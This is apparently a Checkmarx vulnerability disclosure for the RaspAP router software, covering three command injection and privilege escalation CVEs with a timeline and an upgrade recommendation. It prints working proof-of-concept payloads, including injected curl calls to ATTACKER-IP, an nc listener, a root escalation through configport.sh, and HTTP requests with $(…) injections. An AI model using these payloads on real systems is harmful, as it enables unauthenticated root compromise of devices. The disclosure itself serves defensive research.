@@ -1,0 +1,141 @@
+
+image: ../../Dataset/Image\checkmarx\20240824_195357_212502\Banner8.png
+According to its official documentation, “RaspAP” is a wireless router software for many popular Debian-based devices, including the Raspberry Pi. It has a mobile-ready interface that gives the user control over the relevant services and networking options which include advanced DHCP settings, WireGuard and OpenVPN support, SSL certificates, security audits, captive portal integration, and more.
+After researching RaspAP, the Checkmarx Security Research Team has found multiple vulnerabilities including OS Command Injection vulnerabilities (CWE-78) that could lead to Remote Code Execution (RCE), as well as a Privilege Escalation vulnerability that could allow an attacker to elevate themselves to root access.
+Impact Summary
+Using a combination of several of the discovered vulnerabilities, an attacker could execute arbitrary operating system commands with root privileges on any host running the RaspAP software. As will be shown below, an attacker can achieve this with or without credentials.
+CVE-2021-33357 Unauthenticated Command Injection
+CVSS Score 10.0 (Critical) CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+Description
+A Command Injection vulnerability exists in “RaspAP” in the “iface” GET parameter in /ajax/networking/get_netcfg.php, when the “iface” parameter value contains special characters such as “;”. Note that while most endpoints on the application require a CSRF token, this endpoint does not. Since no other authentication mechanisms are securing this endpoint, the exploitation does not require any authentication whatsoever and can be triggered directly or via CSRF.
+Vulnerability Analysis
+As can be seen in a CxSAST scan result, the tainted flow in code is quite clear:
+image: ../../Dataset/Image\checkmarx\20240824_195357_212502\11.png
+
+Request matches /ajax/networking/get_netcfg.php with $_GET[‘iface’] parameter and loads into the $interface variable – https://github.com/RaspAP/raspap-webgui/blob/8f0ae3b36aa1020d21477e66010c6b2146e7c222/ajax/networking/get_netcfg.php#L6
+The $interface variable is concatenated to the following command and executed:
+
+exec(‘cat ‘. RASPI_DNSMASQ_PREFIX.$interface.’.conf’, $return);
+https://github.com/RaspAP/raspap-webgui/blob/8f0ae3b36aa1020d21477e66010c6b2146e7c222/ajax/networking/get_netcfg.php#L10
+
+exec(‘cat ‘. RASPI_DNSMASQ_PREFIX.$interface.’.conf’, $return);
+https://github.com/RaspAP/raspap-webgui/blob/8f0ae3b36aa1020d21477e66010c6b2146e7c222/ajax/networking/get_netcfg.php#L10
+The endpoint /ajax/networking/get_netcfg.php does require the /includes/csrf.php page, which is supposed to ensure only authenticated users can perform meaningful actions, but upon inspection, we see:
+
+In /includes/csrf.php there is a call to csrfValidateRequest in /includes/functions.php – https://github.com/RaspAP/raspap-webgui/blob/8f0ae3b36aa1020d21477e66010c6b2146e7c222/includes/csrf.php#L6
+In includes/functions.php the function csrfValidateRequest only handles “POST”, “PUT”, “PATCH” and “DELETE” requests (whereas our endpoint handles the “GET” parameter $_GET[‘iface’])
+
+https://github.com/RaspAP/raspap-webgui/blob/061d01cbd56411adbe52a313ff8d04e2bfa893bc/includes/functions.php#L286
+
+https://github.com/RaspAP/raspap-webgui/blob/061d01cbd56411adbe52a313ff8d04e2bfa893bc/includes/functions.php#L286
+Proof-of-Concept
+
+Create a basic RaspAP instance by following the guide here.
+On the attacker machine, open a socket listener:
+
+nc -nvlp 4444
+
+nc -nvlp 4444
+Browse to:
+http://raspap-ip/ajax/networking/get_netcfg.php?iface=;curl%20http://ATTACKER-IP:4444/`whoami`;
+
+image: ../../Dataset/Image\checkmarx\20240824_195357_212502\21.png
+As we can see, the attacker has received a request from the victim requesting the page “www-data”, which is the username of the user running the webserver.
+CVE-2021-33356 Privilege Escalation
+CVSS Score 9.9 (Critical) CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
+Description
+The application runs multiple OS commands with sudo. To be able to do so, it adds permissions to run OS commands with sudo without a password during the installation.
+The list of available commands is on the picture:
+Whereas some of these files are owned by root, some files in the /etc/raspap folder are owned by the www-data user or group, which gives write permissions to these files. If an attacker can run OS commands as www-data, then they can modify one of the files and add arbitrary bash commands. Afterward, they can run the modified file with root privileges using sudo.
+By chaining the unauthenticated OS command injection vulnerability mentioned in this report it’s possible to run OS commands as root without authentication.
+Proof-of-Concept
+1. Create basic RaspAP instance by following the guide here.
+2. On the attacker machine, open a socket listener:
+
+nc -nvlp 4444
+3. Browse to: http://raspaddress/ajax/networking/get_netcfg.php?iface=;echo%20%22curl%20http://ATTACKERIP:PORT/`whoami`%22%20%3E%3E%20/etc/raspap/lighttpd/configport.sh%20;sudo%20/etc/raspap/lighttpd/configport.sh%2080%20127.0.0.1%20/etc/lighttpd/lighttpd.conf%20localhost
+This time the requested page “root” shows us the command was run with root privileges.
+CVE-2021-33358 Authenticated Command Injection
+CVSS Score 9.9 (Critical) CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
+RaspAP allows creating an Access Point (AP) with the defined settings. After the settings are saved, it provides the user with a QR code that contains the SSID and password of the AP created by the application. This feature is available after authentication.
+An authenticated attacker can send a POST request with a malicious payload in the “interface”, “ssid”, or “wpa_passphrase” field to run arbitrary OS commands. The command injected into the “interface” field is executed immediately. The commands injected into SSID and password fields require an additional request to the QR-code generation page to be triggered.
+Vulnerability Analysis
+
+The QR code is built in https://github.com/RaspAP/raspap-webgui/blob/master/app/img/wifi-qr-code.php file. It takes ssid and password from hostapd config file (https://github.com/RaspAP/raspap-webgui/blob/8f0ae3b36aa1020d21477e66010c6b2146e7c222/app/img/wifi-qr-code.php#L18).
+The SSID and password are processed through qr_encode function that replaces part of the characters (https://github.com/RaspAP/raspap-webgui/blob/8f0ae3b36aa1020d21477e66010c6b2146e7c222/app/img/wifi-qr-code.php#L15), but it leaves $, (, ) and /.
+Later (https://github.com/RaspAP/raspap-webgui/blob/8f0ae3b36aa1020d21477e66010c6b2146e7c222/app/img/wifi-qr-code.php#L44) while building the OS command, the concatenated data is processed with mb_escapeshellarg function, which only escapes quotes (https://github.com/RaspAP/raspap-webgui/blob/e3c00a80920ae2dea516ebdd3921335eb51231f6/includes/functions.php#L523). Therefore, setting the password equal to $(touch /tmp/123) allows running an OS command.
+The “interface” parameter value is directly inserted into a system command without sanitization after the HTTP request that updated the AP configuration  (https://github.com/RaspAP/raspap-webgui/blob/6d3966dd8a54dad2b85b39f2ab0fa476143f2059/includes/hostapd.php#L64)
+To reproduce the vulnerability, open the security settings of the hotspot, as shown in the picture above, and insert the OS command into the password field in the following format: $(OS COMMAND). Note that some of the symbols are filtered, but this can be bypassed by using the base64 encoded OS command.
+
+Create a basic RaspAP instance by following the guide here.
+After authenticating, send the following HTTP requests to the RaspAP host:
+
+POST /hostapd_conf HTTP/1.1 
+Host: localhost 
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 
+Accept-Language: en-US,en;q=0.5 
+Accept-Encoding: gzip, deflate 
+Content-Type: application/x-www-form-urlencoded 
+Content-Length: 355 
+Origin: http://localhost 
+Authorization: Basic YWRtaW46c2VjcmV0 
+Connection: close 
+Referer: http://localhost/hostapd_conf 
+Cookie: PHPSESSID=j99hb7n50dp4d26no5ccnjhf2o 
+Upgrade-Insecure-Requests: 1 
+ 
+csrf_token=ce138993d5ecd5d041fb805425ab069d700251a1be50e2ade5d51c5fa084f282&interface=lo;touch%20/tmp/checkinterface;&ssid=%24%28touch+%2Ftmp%2Fcheckssid%29&hw_mode=g&channel=1&wpa=2&wpa_pairwise=CCMP&wpa_passphrase=%24%28touch+%2Ftmp%2Fcheckpass%29&beaconintervalEnable=1&beacon_interval=100&max_num_sta=&country_code=AF&SaveHostAPDSettings=Save+settings 
+GET /app/img/wifi-qr-code.php HTTP/1.1 
+Host: localhost 
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 
+Accept: image/webp,*/* 
+Accept-Language: en-US,en;q=0.5 
+Accept-Encoding: gzip, deflate 
+Authorization: Basic YWRtaW46c2VjcmV0 
+Connection: close 
+Referer: http://localhost/hostapd_conf 
+Cookie: PHPSESSID=j99hb7n50dp4d26no5ccnjhf2o
+
+POST /hostapd_conf HTTP/1.1 
+Host: localhost 
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 
+Accept-Language: en-US,en;q=0.5 
+Accept-Encoding: gzip, deflate 
+Content-Type: application/x-www-form-urlencoded 
+Content-Length: 355 
+Origin: http://localhost 
+Authorization: Basic YWRtaW46c2VjcmV0 
+Connection: close 
+Referer: http://localhost/hostapd_conf 
+Cookie: PHPSESSID=j99hb7n50dp4d26no5ccnjhf2o 
+Upgrade-Insecure-Requests: 1 
+ 
+csrf_token=ce138993d5ecd5d041fb805425ab069d700251a1be50e2ade5d51c5fa084f282&interface=lo;touch%20/tmp/checkinterface;&ssid=%24%28touch+%2Ftmp%2Fcheckssid%29&hw_mode=g&channel=1&wpa=2&wpa_pairwise=CCMP&wpa_passphrase=%24%28touch+%2Ftmp%2Fcheckpass%29&beaconintervalEnable=1&beacon_interval=100&max_num_sta=&country_code=AF&SaveHostAPDSettings=Save+settings
+GET /app/img/wifi-qr-code.php HTTP/1.1 
+Host: localhost 
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 
+Accept: image/webp,*/* 
+Accept-Language: en-US,en;q=0.5 
+Accept-Encoding: gzip, deflate 
+Authorization: Basic YWRtaW46c2VjcmV0 
+Connection: close 
+Referer: http://localhost/hostapd_conf 
+Cookie: PHPSESSID=j99hb7n50dp4d26no5ccnjhf2o
+On the victim machine, we see all 3 files were created:
+Recommendations
+The developer released a fix. To avoid these issues, update RaspAP to version 2.6.6 or higher.
+Timeline of Disclosure
+
+Apr 21, 2021 – Disclosure
+Apr 21, 2021 – Issue acknowledged by RaspAP
+May 2, 2021 – Fix committed
+June 10, 2021 – CVE-2021-33356, CVE-2021-33357, and CVE-2021-33358 assigned
+June 6, 2021 – Fixed version released
+July 28, 2021 – Public disclosure
+Final Words
+This type of research is part of the Checkmarx Security Research Team’s ongoing efforts to drive the necessary changes in software security practices among all organizations. Checkmarx is committed to analyzing open-source software to help development teams build and deploy more secure applications. Our database of open source libraries and vulnerabilities is cultivated by the Checkmarx Security Research Team, empowering CxSCA customers with risk details, remediation guidance, and exclusive vulnerabilities that go beyond the NVD.
+Copyright Notices
+RaspAP/raspap-webgui is licensed under the GNU General Public License v3.0
+Copyright (C) 2007 Free Software Foundation, Inc. <http://fsf.org/>. Everyone is permitted to copy and distribute verbatim copies of this licensed document, but changing it is not allowed.
